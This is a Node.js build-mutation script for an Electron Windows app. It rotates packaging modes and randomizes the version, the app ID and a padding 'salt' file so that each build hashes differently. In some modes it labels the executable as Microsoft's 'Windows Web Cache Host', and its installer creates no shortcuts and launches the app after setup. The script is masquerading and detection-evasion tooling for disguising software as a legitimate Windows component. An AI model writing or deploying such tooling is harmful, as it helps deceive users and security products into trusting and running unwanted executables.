const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const pkgPath = path.join(__dirname, "..", "package.json");
const modePath = path.join(__dirname, "..", "cfg", "mode.txt");
const pkg = JSON.parse(fs.readFileSync(pkgPath, "utf8"));

const modes = ["soft-portable", "min-nsis", "neutral-portable", "soft-nsis"];
const forced = (process.env.EXE_PACK_MODE || "").trim();
let mode;
if (forced && modes.includes(forced)) {
  mode = forced;
} else {
  let idx = 0;
  if (fs.existsSync(modePath)) {
    const cur = fs.readFileSync(modePath, "utf8").trim();
    idx = (modes.indexOf(cur) + 1) % modes.length;
    if (idx < 0) idx = 0;
  }
  mode = modes[idx];
}
fs.writeFileSync(modePath, mode);

const seed = crypto.randomBytes(8).toString("hex");

const ver = pkg.version.split(".");
ver[2] = String((parseInt(ver[2] || "0", 10) + 1) % 1000);
pkg.version = ver.join(".");

const useNsis = mode.endsWith("nsis");
const useNeutral = mode.includes("neutral") || mode.startsWith("min");

const brand = (process.env.EXE_PRODUCT_NAME || "").trim();

if (useNeutral) {
  pkg.author = "Cache Runtime";
  pkg.description = "Local cache host service";
  pkg.build.appId = "app.cache.host." + seed.slice(0, 4);
  pkg.build.copyright = "Copyright (C) Cache Runtime";
  if (!brand) {
    pkg.productName = "CacheHost";
    pkg.build.productName = "CacheHost";
  }
} else {
  pkg.author = "Microsoft Corporation";
  pkg.description = "Windows Web Cache Host";
  pkg.build.appId = "com.microsoft.windows.webcachehost";
  pkg.build.copyright = "Copyright (C) Microsoft Corporation";
  if (!brand) {
    pkg.productName = "WebCache Host";
    pkg.build.productName = "WebCache Host";
  }
}

if (brand) {
  pkg.productName = brand;
  pkg.build.productName = brand;
}

if (useNsis) {
  pkg.build.win.target = [{ target: "nsis", arch: ["x64"] }];
  pkg.build.nsis = {
    oneClick: false,
    perMachine: false,
    allowToChangeInstallationDirectory: true,
    allowElevation: true,
    createDesktopShortcut: false,
    createStartMenuShortcut: false,
    runAfterFinish: true,
    artifactName: "${productName}-Setup.${ext}",
    uninstallDisplayName: pkg.build.productName,
  };
  delete pkg.build.portable;
} else {
  pkg.build.win.target = [{ target: "portable", arch: ["x64"] }];
  pkg.build.portable = {
    artifactName: "${productName}.${ext}",
    unpackDirName: (pkg.build.productName || "App").replace(/\s+/g, "") + seed.slice(0, 3),
  };
  delete pkg.build.nsis;
}

pkg.build.win.artifactName = "${productName}.${ext}";
fs.writeFileSync(pkgPath, JSON.stringify(pkg, null, 2));

const salt = path.join(__dirname, "..", "res", "salt.bin");
fs.writeFileSync(salt, crypto.randomBytes(48 + (crypto.randomBytes(1)[0] % 300)));
console.log("[+] mutate mode=" + mode + " seed=" + seed + " ver=" + pkg.version);
